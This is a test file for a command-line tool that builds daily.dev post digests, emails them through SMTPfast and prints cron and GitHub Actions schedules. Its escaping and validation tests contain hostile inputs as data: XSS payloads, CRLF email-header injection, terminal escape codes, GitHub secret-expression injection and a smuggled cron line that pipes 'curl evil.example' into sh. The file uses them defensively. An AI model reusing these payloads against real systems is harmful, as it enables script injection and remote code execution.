import { describe, expect, it } from "vitest";
import type { Post } from "../src/api.ts";
import { run } from "../src/cli.ts";
import { buildDigest, escapeHtml, planDigest, renderHtml, renderMarkdown, type DigestPlan } from "../src/digest.ts";
import { MISSING_KEY } from "../src/smtpfast.ts";
import { VERSION } from "../src/version.ts";

const NOW = Date.parse("2026-10-08T12:00:00Z");
const DAY = 86_400_000;

const post = (over: Partial<Post> = {}): Post => ({
  id: "D2ornCubs",
  title: "A Missing Binary Turned a Kubernetes Liveness Probe Into a Restart Loop",
  url: "https://example.com/article",
  summary: "The probe used pgrep, which the slim image did not have.",
  type: "article",
  publishedAt: "2026-09-25T10:42:11.000Z",
  createdAt: "2026-10-07T11:39:15.045Z",
  commentsPermalink: "https://daily.dev/posts/a-missing-binary-d2orncubs",
  source: { id: "cloudnativenow", name: "Cloud Native Now" },
  tags: ["kubernetes"],
  readTime: 5,
  numUpvotes: 27,
  numComments: 2,
  ...over,
});

interface Call {
  method: string;
  url: URL;
  headers: Record<string, string>;
  redirect?: RequestRedirect;
  body?: unknown;
}

type Reply = { status?: number; body?: unknown; headers?: Record<string, string> };

const KEY = "sf_test_key_123";
const SEND = "POST smtpfa.st/api/v1/emails/batch";
/** SMTPfast's batch answer: one id and status per email, in request order. */
const batch = (...statuses: string[]) => ({
  body: { batch_id: "b_1", count: statuses.length, emails: statuses.map((status, i) => ({ id: `em_${i + 1}`, status })), data: statuses.map((_, i) => ({ id: `em_${i + 1}` })) },
});

function harness(responses: Record<string, Reply> = {}) {
  const calls: Call[] = [];
  let out = "";
  let err = "";
  const fetchMock = (async (input: URL | string, init: RequestInit) => {
    const url = new URL(String(input));
    calls.push({ method: init.method ?? "GET", url, headers: init.headers as Record<string, string>, redirect: init.redirect, body: init.body ? JSON.parse(String(init.body)) : undefined });
    const r = responses[`${init.method ?? "GET"} ${url.host}${url.pathname}`] ?? { body: { data: [post()], pagination: { hasNextPage: false, cursor: null } } };
    return new Response(r.body === undefined ? null : JSON.stringify(r.body), { status: r.status ?? 200, headers: r.headers });
  }) as unknown as typeof fetch;

  const exec = (argv: string[], env: Record<string, string | undefined> = { DAILY_DEV_TOKEN: "dda_test" }) =>
    run(argv, {
      env,
      fetch: fetchMock,
      now: NOW,
      stdout: { write: (s: string) => (out += s), isTTY: false, columns: 80 },
      stderr: { write: (s: string) => (err += s) },
    });

  return {
    calls,
    exec,
    out: () => out,
    err: () => err,
    sends: () => calls.filter((c) => c.url.host === "smtpfa.st"),
  };
}

const sendEnv = (extra: Record<string, string> = {}) => ({ DAILY_DEV_TOKEN: "dda_test", SMTPFAST_API_KEY: KEY, ...extra });

describe("digest sources", () => {
  it.each([
    { argv: [], path: "/public/v1/feeds/popular", query: { limit: "10" }, heading: "# Popular on daily.dev" },
    { argv: ["popular", "--tags", "kubernetes,docker"], path: "/public/v1/feeds/popular", query: { limit: "10", tags: "kubernetes,docker" }, heading: "# Popular on daily.dev: kubernetes, docker" },
    { argv: ["discussed", "--tags", "rust"], path: "/public/v1/feeds/discussed", query: { limit: "10", period: "7", tag: "rust" }, heading: "# Most discussed on daily.dev this week: rust" },
    { argv: ["tag", "kubernetes", "-n", "5"], path: "/public/v1/feeds/tag/kubernetes", query: { limit: "5" }, heading: "# Latest kubernetes posts on daily.dev" },
    { argv: ["search", "terraform", "state"], path: "/public/v1/search/posts", query: { limit: "50", q: "terraform state", time: "week" }, heading: '# daily.dev search "terraform state", last 7 days' },
    { argv: ["feed"], path: "/public/v1/feeds/foryou", query: { limit: "10" }, heading: "# Your daily.dev feed" },
    { argv: ["bookmarks"], path: "/public/v1/bookmarks/", query: { limit: "10" }, heading: "# Your daily.dev bookmarks" },
  ])("builds a digest from dailydev digest $argv", async ({ argv, path, query, heading }) => {
    const h = harness();
    expect(await h.exec(["digest", ...argv])).toBe(0);
    expect(h.calls).toHaveLength(1);
    expect(h.calls[0].url.host).toBe("api.daily.dev");
    expect(h.calls[0].url.pathname).toBe(path);
    expect(Object.fromEntries(h.calls[0].url.searchParams)).toEqual(query);
    expect(h.calls[0].headers.Authorization).toBe("Bearer dda_test");
    expect(h.out()).toContain(`${heading}\n\n2026-10-08 · 1 post\n`);
    expect(h.out()).toContain("1. **[A Missing Binary Turned a Kubernetes Liveness Probe Into a Restart Loop](https://daily.dev/posts/a-missing-binary-d2orncubs)**\\");
    expect(h.out()).toContain("Cloud Native Now · 27 upvotes · 2 comments · 5 min read · 13d ago");
  });

  it("keeps the search posts that daily.dev added in the last --days days, up to --limit", async () => {
    const posts = [post({ id: "a", title: "One day", createdAt: new Date(NOW - 1 * DAY).toISOString() }), post({ id: "b", title: "Two days", createdAt: new Date(NOW - 2 * DAY).toISOString() }), post({ id: "c", title: "Five days", createdAt: new Date(NOW - 5 * DAY).toISOString() })];
    const h = harness({ "GET api.daily.dev/public/v1/search/posts": { body: { data: posts } } });
    await h.exec(["digest", "search", "postgres", "--days", "3", "--json"]);
    expect(h.calls[0].url.searchParams.get("time")).toBe("week");
    expect(JSON.parse(h.out()).posts.map((p: Post) => p.id)).toEqual(["a", "b"]);

    const one = harness({ "GET api.daily.dev/public/v1/search/posts": { body: { data: posts } } });
    await one.exec(["digest", "search", "postgres", "--days", "30", "-n", "1", "--json"]);
    expect(one.calls[0].url.searchParams.get("time")).toBe("month");
    expect(JSON.parse(one.out()).posts.map((p: Post) => p.id)).toEqual(["a"]);
  });

  it("prints text and html formats", async () => {
    const t = harness();
    await t.exec(["digest", "--format", "text"]);
    expect(t.out()).toBe(
      [
        "Popular on daily.dev (2026-10-08)",
        "",
        "1. A Missing Binary Turned a Kubernetes Liveness Probe Into a Restart Loop",
        "   Cloud Native Now · 27 upvotes · 2 comments · 5 min read · 13d ago",
        "   The probe used pgrep, which the slim image did not have.",
        "   https://daily.dev/posts/a-missing-binary-d2orncubs",
        "",
      ].join("\n"),
    );

    const html = harness();
    await html.exec(["digest", "--format", "html"]);
    expect(html.out()).toMatch(/^<!doctype html>/);
    expect(html.out()).toContain('<a href="https://daily.dev/posts/a-missing-binary-d2orncubs"');
  });

  it("prints the subject and the raw posts with --json", async () => {
    const raw = post({ title: "Raw\x1b[2J title" });
    const h = harness({ "GET api.daily.dev/public/v1/feeds/popular": { body: { data: [raw] } } });
    await h.exec(["digest", "--json"]);
    expect(JSON.parse(h.out())).toEqual({ subject: "Popular on daily.dev (2026-10-08)", posts: [raw] });
  });

  it("says when there are no posts", async () => {
    const h = harness({ "GET api.daily.dev/public/v1/feeds/foryou": { body: { data: [] } } });
    expect(await h.exec(["digest", "feed"])).toBe(0);
    expect(h.out()).toBe("No posts found for this digest.\n");
  });
});

describe("digest escaping", () => {
  const evil = post({
    title: `<script>alert("x")</script> & 'quotes'`,
    source: { id: "s", name: "<b>Evil</b> Source" },
    summary: "<iframe src=//evil.example></iframe>",
    commentsPermalink: 'https://daily.dev/posts/x?a=1&b="><img src=x onerror=alert(1)>',
  });
  const plan = (planDigest({}, [], {}) as { plan: DigestPlan }).plan;

  it("HTML-escapes titles, source names, summaries and URLs in the HTML email", () => {
    const html = renderHtml(buildDigest(plan, [evil], NOW), NOW);
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<b>");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<img");
    expect(html).not.toContain('"><');
    expect(html).toContain("&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; &amp; &#39;quotes&#39;");
    expect(html).toContain("&lt;b&gt;Evil&lt;/b&gt; Source");
    expect(html).toContain('href="https://daily.dev/posts/x?a=1&amp;b=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E"');
  });

  it("links only to http and https URLs", () => {
    const html = renderHtml(buildDigest(plan, [post({ commentsPermalink: "javascript:alert(1)", url: "data:text/html,hi" })], NOW), NOW);
    expect(html).not.toContain("href=");
    expect(html).not.toContain("javascript:");
  });

  it("escapes the subject in the HTML title and the markdown heading", () => {
    const p = (planDigest({ tags: "<k8s>" }, [], {}) as { plan: DigestPlan }).plan;
    expect(renderHtml(buildDigest(p, [post()], NOW), NOW)).toContain("<title>Popular on daily.dev: &lt;k8s&gt; (2026-10-08)</title>");
    expect(renderMarkdown(buildDigest(p, [post()], NOW), NOW)).toContain("# Popular on daily.dev: \\<k8s\\>");
  });

  it("keeps API text from turning into markdown links or raw HTML", () => {
    const md = renderMarkdown(buildDigest(plan, [post({ title: "[click](javascript:alert(1)) <img src=x>" })], NOW), NOW);
    expect(md).toContain("\\[click\\](javascript:alert(1)) \\<img src=x\\>");
  });

  it("escapes every special HTML character", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("removes terminal control characters from human output", async () => {
    const h = harness({ "GET api.daily.dev/public/v1/feeds/popular": { body: { data: [post({ title: "Fine\x1b]0;pwned\x07 title" })] } } });
    await h.exec(["digest"]);
    expect(h.out()).not.toMatch(/[\x00-\x08\x0b-\x1f\x7f]/);
  });
});

describe("digest --email", () => {
  const emailArgs = ["digest", "--email", "a@team.dev,b@team.dev", "--email", "c@team.dev", "--from", "Digest <digest@team.dev>"];

  it("prints one line and exits 1 when SMTPFAST_API_KEY is not set", async () => {
    const h = harness();
    expect(await h.exec(emailArgs)).toBe(1);
    expect(h.err()).toBe(`${MISSING_KEY}\n`);
    expect(MISSING_KEY).toBe("Set SMTPFAST_API_KEY to send the digest by email. Get a free key at https://smtpfa.st.");
    expect(h.out()).toBe("");
    expect(h.calls).toHaveLength(0);

    const blank = harness();
    expect(await blank.exec(emailArgs, { DAILY_DEV_TOKEN: "dda_test", SMTPFAST_API_KEY: "  " })).toBe(1);
    expect(blank.err()).toBe(`${MISSING_KEY}\n`);

    // Still one line when the daily.dev token is missing too.
    const neither = harness();
    expect(await neither.exec(emailArgs, {})).toBe(1);
    expect(neither.err()).toBe(`${MISSING_KEY}\n`);
    expect(neither.calls).toHaveLength(0);
  });

  it("refuses a key with spaces or control characters without printing it", async () => {
    const h = harness();
    expect(await h.exec(emailArgs, { DAILY_DEV_TOKEN: "dda_test", SMTPFAST_API_KEY: "sf_secret part\n2" })).toBe(1);
    expect(h.err()).toContain("SMTPFAST_API_KEY has characters that an API key cannot have");
    expect(h.err()).not.toContain("sf_secret");
    expect(h.calls).toHaveLength(0);
  });

  it("does not mention SMTPfast when no email is asked for", async () => {
    const h = harness();
    await h.exec(["digest"]);
    expect(h.out() + h.err()).not.toMatch(/smtpfa|SMTPFAST/i);
  });

  it("prints the digest for --dry-run without --email, since there is nothing to send", async () => {
    const h = harness();
    const plain = harness();
    expect(await h.exec(["digest", "--tags", "kubernetes", "--dry-run"])).toBe(0);
    expect(await plain.exec(["digest", "--tags", "kubernetes"])).toBe(0);
    expect(h.out()).toBe(plain.out());
    expect(h.out() + h.err()).not.toMatch(/smtpfa|SMTPFAST/i);
  });

  it("shows the subject, recipients and posts on a dry run, and sends nothing", async () => {
    const h = harness();
    expect(await h.exec([...emailArgs, "--dry-run"], sendEnv())).toBe(0);
    expect(h.sends()).toHaveLength(0);
    expect(h.calls).toHaveLength(1);
    expect(h.out()).toContain(
      [
        "Dry run: nothing was sent.",
        "From:    Digest <digest@team.dev>",
        "To:      a@team.dev, b@team.dev, c@team.dev (one email each)",
        "Subject: Popular on daily.dev (2026-10-08)",
        "",
        "1. A Missing Binary Turned a Kubernetes Liveness Probe Into a Restart Loop",
      ].join("\n"),
    );

    // A dry run needs no key, and says nothing about one.
    const noKey = harness();
    expect(await noKey.exec([...emailArgs, "--dry-run", "--json"])).toBe(0);
    expect(noKey.sends()).toHaveLength(0);
    expect(noKey.err()).toBe("");
    expect(JSON.parse(noKey.out())).toMatchObject({ dryRun: true, from: "Digest <digest@team.dev>", to: ["a@team.dev", "b@team.dev", "c@team.dev"], subject: "Popular on daily.dev (2026-10-08)" });
  });

  it("sends one recipient one email in one batch call, with the key and no redirects", async () => {
    const h = harness({ [SEND]: batch("queued") });
    expect(await h.exec(["digest", "--email", "a@team.dev", "--from", "Digest <digest@team.dev>"], sendEnv())).toBe(0);
    const [send] = h.sends();
    expect(h.sends()).toHaveLength(1);
    expect(send.url.href).toBe("https://smtpfa.st/api/v1/emails/batch");
    expect(send.method).toBe("POST");
    expect(send.redirect).toBe("manual");
    expect(send.headers.Authorization).toBe(`Bearer ${KEY}`);
    expect(send.headers["Content-Type"]).toBe("application/json");
    expect(send.headers["User-Agent"]).toBe(`dailydev-cli/${VERSION}`);

    const items = send.body as Record<string, unknown>[];
    expect(items).toHaveLength(1);
    expect(Object.keys(items[0]).sort()).toEqual(["from", "html", "subject", "text", "to"]);
    expect(items[0].from).toBe("Digest <digest@team.dev>");
    expect(items[0].to).toEqual(["a@team.dev"]);
    expect(items[0].subject).toBe("Popular on daily.dev (2026-10-08)");
    expect(items[0].html).toContain("A Missing Binary Turned a Kubernetes Liveness Probe Into a Restart Loop");
    expect(items[0].text).toMatch(/^Popular on daily\.dev \(2026-10-08\)\n\n1\. A Missing Binary/);

    expect(h.out()).toBe('SMTPfast accepted "Popular on daily.dev (2026-10-08)" for 1 recipient, one email each:\n  a@team.dev  accepted (queued), id em_1\n');
    expect(h.err()).toBe("");
    expect(h.out() + h.err()).not.toContain(KEY);
  });

  it("sends three recipients one email each, so nobody sees the other addresses", async () => {
    const h = harness({ [SEND]: batch("queued", "queued", "queued") });
    expect(await h.exec([...emailArgs, "--email", "A@team.dev"], sendEnv())).toBe(0);
    expect(h.sends()).toHaveLength(1);
    const items = h.sends()[0].body as { to: string[]; subject: string; html: string }[];
    expect(items.map((i) => i.to)).toEqual([["a@team.dev"], ["b@team.dev"], ["c@team.dev"]]);
    expect(new Set(items.map((i) => i.subject)).size).toBe(1);
    for (const item of items) expect(JSON.stringify(item).match(/@team\.dev/g)).toHaveLength(2);

    expect(h.out()).toBe(
      [
        'SMTPfast accepted "Popular on daily.dev (2026-10-08)" for 3 recipients, one email each:',
        "  a@team.dev  accepted (queued), id em_1",
        "  b@team.dev  accepted (queued), id em_2",
        "  c@team.dev  accepted (queued), id em_3",
        "",
      ].join("\n"),
    );
  });

  it("reports each recipient and exits 1 when one of three emails is not sent", async () => {
    const h = harness({ [SEND]: batch("queued", "failed", "queued") });
    expect(await h.exec(emailArgs, sendEnv())).toBe(1);
    expect(h.out()).toBe(
      [
        'SMTPfast accepted "Popular on daily.dev (2026-10-08)" for 2 of 3 recipients, one email each:',
        "  a@team.dev  accepted (queued), id em_1",
        "  b@team.dev  not sent: SMTPfast did not send it, because the address is suppressed after an earlier bounce, complaint or unsubscribe.",
        "  c@team.dev  accepted (queued), id em_3",
        "",
      ].join("\n"),
    );
    expect(h.err()).toBe("Not accepted: 1 of 3 emails.\n");

    const j = harness({ [SEND]: batch("queued", "failed", "queued") });
    expect(await j.exec([...emailArgs, "--json"], sendEnv())).toBe(1);
    expect(JSON.parse(j.out()).results).toEqual([
      { to: "a@team.dev", accepted: true, status: "queued", id: "em_1" },
      { to: "b@team.dev", accepted: false, status: "failed", id: "em_2", error: expect.stringContaining("suppressed") },
      { to: "c@team.dev", accepted: true, status: "queued", id: "em_3" },
    ]);
  });

  it("does not claim a send when SMTPfast returns fewer results than emails", async () => {
    const h = harness({ [SEND]: batch("queued") });
    expect(await h.exec(emailArgs, sendEnv())).toBe(1);
    expect(h.err()).toContain("without a result for each email");
    expect(h.err()).toContain("may or may not have gone out");
    expect(h.out()).toBe("");
  });

  it("takes the From address from SMTPFAST_FROM and prints the results with --json", async () => {
    const h = harness({ [SEND]: batch("queued") });
    expect(await h.exec(["digest", "tag", "rust", "--email", "me@team.dev", "--json"], sendEnv({ SMTPFAST_FROM: "digest@team.dev" }))).toBe(0);
    expect((h.sends()[0].body as { from: string }[])[0].from).toBe("digest@team.dev");
    expect(JSON.parse(h.out())).toMatchObject({ from: "digest@team.dev", to: ["me@team.dev"], subject: "Latest rust posts on daily.dev (2026-10-08)", results: [{ to: "me@team.dev", accepted: true, status: "queued", id: "em_1" }] });
  });

  it("escapes API text in the email it sends", async () => {
    const evil = post({ title: "<script>x</script>", source: { id: "s", name: "<b>S</b>" } });
    const h = harness({ "GET api.daily.dev/public/v1/feeds/popular": { body: { data: [evil] } }, [SEND]: batch("queued", "queued", "queued") });
    await h.exec(emailArgs, sendEnv());
    const [{ html }] = h.sends()[0].body as { html: string }[];
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<b>S</b>");
    expect(html).toContain("&lt;script&gt;x&lt;/script&gt;");
  });

  it("shows SMTPfast's error when it refuses the From domain", async () => {
    const h = harness({ [SEND]: { status: 403, body: { error: "Item 0: domain team.dev is not verified" } } });
    expect(await h.exec(emailArgs, sendEnv())).toBe(1);
    expect(h.err()).toBe(
      "SMTPfast refused the emails (403): Item 0: domain team.dev is not verified. The From address must be on a domain you verified in your SMTPfast account. No email was sent.\n",
    );
    expect(h.out()).toBe("");
    expect(h.err()).not.toContain(KEY);
  });

  it("explains a rejected key, a server error and a redirect without following it", async () => {
    const bad = harness({ [SEND]: { status: 401, body: { error: "Invalid API key" } } });
    expect(await bad.exec(emailArgs, sendEnv())).toBe(1);
    expect(bad.err()).toBe("SMTPfast refused the emails (401): Invalid API key. Check SMTPFAST_API_KEY. No email was sent.\n");

    const echo = harness({ [SEND]: { status: 401, body: { error: `Invalid key ${KEY}` } } });
    expect(await echo.exec(emailArgs, sendEnv())).toBe(1);
    expect(echo.err()).toBe("SMTPfast refused the emails (401): Invalid key [key]. Check SMTPFAST_API_KEY. No email was sent.\n");

    // Redacted before the message is shortened, so no part of the key is left at the cut.
    const long = harness({ [SEND]: { status: 400, body: { error: "x".repeat(286) + KEY } } });
    expect(await long.exec(emailArgs, sendEnv())).toBe(1);
    expect(long.err()).not.toContain(KEY.slice(0, 6));

    const down = harness({ [SEND]: { status: 502, body: { error: "Bad gateway\x1b[2J" } } });
    expect(await down.exec(emailArgs, sendEnv())).toBe(1);
    expect(down.err()).toContain("SMTPfast answered 502: Bad gateway");
    expect(down.err()).toContain("may or may not have gone out");
    expect(down.err()).not.toContain("\x1b");

    const moved = harness({ [SEND]: { status: 307, headers: { location: "https://elsewhere.example/" } } });
    expect(await moved.exec(emailArgs, sendEnv())).toBe(1);
    expect(moved.err()).toContain("does not follow redirects");
    expect(moved.sends()).toHaveLength(1);
    expect(moved.calls.some((c) => c.url.host === "elsewhere.example")).toBe(false);
  });

  // The digest request goes to daily.dev; `smtpfast` decides what the SMTPfast call does.
  async function sendWith(smtpfast: () => Promise<Response>) {
    let out = "";
    let err = "";
    const fetchMock = (async (input: URL | string) => (String(input).startsWith("https://smtpfa.st") ? smtpfast() : new Response(JSON.stringify({ data: [post()] }), { status: 200 }))) as unknown as typeof fetch;
    const code = await run(emailArgs, { env: sendEnv(), fetch: fetchMock, now: NOW, stdout: { write: (s: string) => (out += s) }, stderr: { write: (s: string) => (err += s) } });
    return { code, out, err };
  }
  const UNSURE = "The emails may or may not have gone out. Check your SMTPfast dashboard before you send again.";

  it("says no email was sent only when the connection failed before the request went out", async () => {
    const r = await sendWith(async () => {
      throw new TypeError(`fetch failed: header Bearer ${KEY}`, { cause: { code: "ENOTFOUND" } });
    });
    expect(r.code).toBe(1);
    expect(r.err).toBe("Could not reach SMTPfast (ENOTFOUND). No email was sent.\n");
  });

  it("does not invite a retry after a reset, and does not quote fetch errors, which can contain the key", async () => {
    const r = await sendWith(async () => {
      throw new TypeError(`fetch failed: header Bearer ${KEY}`, { cause: { code: "ECONNRESET" } });
    });
    expect(r.code).toBe(1);
    expect(r.err).toBe(`The connection to SMTPfast failed (ECONNRESET). ${UNSURE}\n`);
    expect(r.err).not.toContain("Could not reach");
  });

  it("does not invite a retry when the answer is cut off while it is read", async () => {
    const r = await sendWith(async () => {
      const body = new ReadableStream({
        start(controller) {
          controller.enqueue(new TextEncoder().encode('{"emails":['));
          controller.error(Object.assign(new TypeError("terminated"), { cause: { code: "UND_ERR_SOCKET" } }));
        },
      });
      return new Response(body, { status: 200 });
    });
    expect(r.code).toBe(1);
    expect(r.err).toBe(`The answer from SMTPfast was cut off (UND_ERR_SOCKET). ${UNSURE}\n`);
    expect(r.out).toBe("");
  });

  it("sends nothing when the digest is empty", async () => {
    const h = harness({ "GET api.daily.dev/public/v1/feeds/popular": { body: { data: [] } } });
    expect(await h.exec(emailArgs, sendEnv())).toBe(0);
    expect(h.sends()).toHaveLength(0);
    expect(h.out()).toBe("No posts found for this digest. No email was sent.\n");
  });

  it("rejects CR, LF and other control characters in --from, --email and the subject", async () => {
    const h = harness();
    expect(await h.exec(["digest", "--email", "me@team.dev", "--from", "digest@team.dev\r\nBcc: all@victim.dev"], sendEnv())).toBe(2);
    expect(h.err()).toContain("--from cannot contain line breaks");
    expect(await h.exec(["digest", "--email", "me@team.dev\nBcc: all@victim.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "--email", "me@team.dev"], sendEnv({ SMTPFAST_FROM: "Digest\r <digest@team.dev>" }))).toBe(2);
    expect(h.err()).toContain("SMTPFAST_FROM cannot contain line breaks");
    expect(await h.exec(["digest", "--tags", "kubernetes\r\nBcc: all@victim.dev", "--email", "me@team.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "search", "ok\nSubject: hi", "--email", "me@team.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "tag", "rust\r", "--email", "me@team.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    expect(h.err()).toContain("go into the email subject");
    // Trimming would hide these, so the raw values are checked.
    expect(await h.exec(["digest", "--email", "me@team.dev\r\n", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "--email", "me@team.dev", "--from", "digest@team.dev\n"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "--email", "me@team.dev"], sendEnv({ SMTPFAST_FROM: "digest@team.dev\r\n" }))).toBe(2);
    // Bidi controls would reorder what the reader sees in the headers.
    expect(await h.exec(["digest", "--email", "me@team.dev\u202e", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "--email", "me@team.dev", "--from", "Digest \u2066 <digest@team.dev>"], sendEnv())).toBe(2);
    expect(await h.exec(["digest", "search", "a\u202eb", "--email", "me@team.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
    for (const mark of ["\u061c", "\u200e", "\u200f"]) {
      expect(await h.exec(["digest", "--email", `me${mark}@team.dev`, "--from", "digest@team.dev"], sendEnv())).toBe(2);
    }
    expect(h.calls).toHaveLength(0);
  });

  it("rejects bad addresses and options that do not fit together", async () => {
    const h = harness();
    const cases = [
      ["digest", "--email", "not-an-address", "--from", "digest@team.dev"],
      ["digest", "--email", "me@team.dev"],
      ["digest", "--email", "me@team.dev", "--from", "Digest <nope>"],
      ["digest", "--email", Array.from({ length: 101 }, (_, i) => `u${i}@team.dev`).join(","), "--from", "digest@team.dev"],
      ["digest", "--email", "me@team.dev", "--from", "digest@team.dev", "--format", "html"],
      ["digest", "--from", "digest@team.dev"],
      ["digest", "--format", "pdf"],
      ["digest", "--format", "html", "--json"],
      ["digest", "nope"],
      ["digest", "tag"],
      ["digest", "search"],
      ["digest", "feed", "extra"],
      ["digest", "feed", "--tags", "rust"],
      ["digest", "discussed", "--tags", "rust,go"],
      ["digest", "popular", "--days", "3"],
      ["digest", "search", "x", "--days", "0"],
      ["digest", "--cursor", "abc"],
    ];
    for (const argv of cases) {
      expect(await h.exec(argv, sendEnv()), argv.join(" ")).toBe(2);
    }
    expect(h.calls).toHaveLength(0);
  });
});

describe("digest --schedule", () => {
  it("prints a weekly cron line and a GitHub Actions workflow, and runs nothing", async () => {
    const h = harness();
    const argv = ["digest", "popular", "--tags", "kubernetes", "--email", "me@team.dev", "--dry-run", "--schedule"];
    expect(await h.exec(argv, { SMTPFAST_FROM: "Digest <digest@team.dev>" })).toBe(0);
    expect(h.calls).toHaveLength(0);
    expect(h.err()).toBe("");

    const command = "digest popular --tags kubernetes --email me@team.dev --from 'Digest <digest@team.dev>'";
    expect(h.out()).toContain(`\n0 8 * * 1 dailydev ${command}\n`);
    expect(h.out()).toContain("Set DAILY_DEV_TOKEN and SMTPFAST_API_KEY in the cron environment");
    expect(h.out()).toContain(
      [
        "on:",
        "  schedule:",
        '    - cron: "0 8 * * 1" # Mondays at 08:00 UTC',
        "  workflow_dispatch:",
        "",
        "permissions:",
        "  contents: read",
      ].join("\n"),
    );
    expect(h.out()).toContain(
      [
        "        env:",
        "          DAILY_DEV_TOKEN: ${{ secrets.DAILY_DEV_TOKEN }}",
        "          SMTPFAST_API_KEY: ${{ secrets.SMTPFAST_API_KEY }}",
        "        run: |",
        `          npx --yes @devopsdaily/dailydev-cli@${VERSION} ${command}`,
      ].join("\n"),
    );
    expect(h.out()).not.toContain("--dry-run");
    expect(h.out()).not.toContain("--schedule");
  });

  it("needs only the daily.dev secret without --email, and escapes % for cron", async () => {
    const h = harness();
    expect(await h.exec(["digest", "search", "100%", "uptime", "--schedule", "--json"], {})).toBe(0);
    const { cron, workflow } = JSON.parse(h.out());
    expect(cron).toBe("0 8 * * 1 dailydev digest search 100\\% uptime");
    expect(workflow).toContain("DAILY_DEV_TOKEN: ${{ secrets.DAILY_DEV_TOKEN }}");
    expect(workflow).not.toContain("SMTPFAST_API_KEY");
    expect(workflow).toContain(`npx --yes @devopsdaily/dailydev-cli@${VERSION} digest search 100% uptime\n`);
  });

  it("checks the command before it prints a schedule for it", async () => {
    const h = harness();
    expect(await h.exec(["digest", "--email", "me@team.dev", "--schedule"], {})).toBe(2);
    expect(h.err()).toContain("Give a From address");
    expect(h.out()).toBe("");
  });

  it("cannot be made to print extra workflow steps or cron lines", async () => {
    const h = harness();
    const step = "rust,\n      - run: echo PWNED #,\n        if: always() #,\n#";
    expect(await h.exec(["digest", "popular", "--tags", step, "--schedule"], {})).toBe(2);
    expect(await h.exec(["digest", "--tags", "rust\n0 * * * * curl evil.example | sh", "--schedule"], {})).toBe(2);
    expect(await h.exec(["digest", "--email", "me@team.dev\n", "--from", "d@team.dev", "--schedule"], {})).toBe(2);
    expect(await h.exec(["digest", "search", "rust\u2028      - run: echo PWNED", "--schedule"], {})).toBe(2);
    expect(h.out()).toBe("");
  });

  it("builds the scheduled command from the checked values, not the raw command line", async () => {
    const h = harness();
    // parseArgs keeps the last of a repeated option, so the first values are never checked or printed.
    expect(await h.exec(["digest", "--tags", "rust\n0 * * * * echo PWNED\n#", "--tags", "safe", "--schedule"], {})).toBe(0);
    expect(await h.exec(["digest", "--tags", "${{ secrets.SMTPFAST_API_KEY }}", "--tags", "safe", "--schedule"], {})).toBe(0);
    expect(h.out()).not.toContain("PWNED");
    expect(h.out()).not.toContain("${{ secrets.SMTPFAST_API_KEY");
    expect(h.out()).toContain("\n0 8 * * 1 dailydev digest popular --tags safe\n");

    const all = harness();
    await all.exec(["digest", "discussed", "--tag", "rust", "-n", "5", "--format", "text", "--schedule", "--json"], {});
    expect(JSON.parse(all.out()).cron).toBe("0 8 * * 1 dailydev digest discussed --tags rust --limit 5 --format text");
  });

  it("keeps search words that look like options after --, so a replay cannot send email", async () => {
    const h = harness();
    expect(await h.exec(["digest", "search", "--schedule", "--json", "--", "rust", "--email=extra@team.dev", "--from=d@team.dev"], {})).toBe(0);
    const { cron } = JSON.parse(h.out());
    expect(cron).toBe("0 8 * * 1 dailydev digest -- search rust --email=extra@team.dev --from=d@team.dev");

    const replay = harness({ [SEND]: batch("queued") });
    const argv = cron.replace("0 8 * * 1 dailydev ", "").split(" ");
    expect(await replay.exec(argv, sendEnv())).toBe(0);
    expect(replay.sends()).toHaveLength(0);
    expect(replay.calls[0].url.searchParams.get("q")).toBe("rust --email=extra@team.dev --from=d@team.dev");
  });

  it("joins a value that starts with - to its option, so the replay reads it", async () => {
    const h = harness();
    expect(await h.exec(["digest", "--email=-me@team.dev", "--from=digest@team.dev", "--schedule", "--json"], {})).toBe(0);
    const { cron } = JSON.parse(h.out());
    expect(cron).toBe("0 8 * * 1 dailydev digest popular --email=-me@team.dev --from digest@team.dev");

    const replay = harness();
    expect(await replay.exec([...cron.replace("0 8 * * 1 dailydev ", "").split(" "), "--dry-run"], sendEnv())).toBe(0);
    expect(replay.out()).toContain("To:      -me@team.dev");
  });

  it("refuses ${{ }}, which GitHub would evaluate inside the workflow", async () => {
    const h = harness();
    expect(await h.exec(["digest", "search", "${{ secrets.SMTPFAST_API_KEY }}", "--schedule"], {})).toBe(2);
    expect(h.err()).toContain("--schedule cannot write ${{ into a GitHub Actions workflow");
    expect(await h.exec(["digest", "--email", "me@team.dev", "--schedule"], { SMTPFAST_FROM: "${{ secrets.X }} <d@team.dev>" })).toBe(2);
    expect(h.out()).toBe("");
    // Without --schedule the text is only a search query.
    expect(await h.exec(["digest", "search", "${{ x }}"])).toBe(0);
  });
});
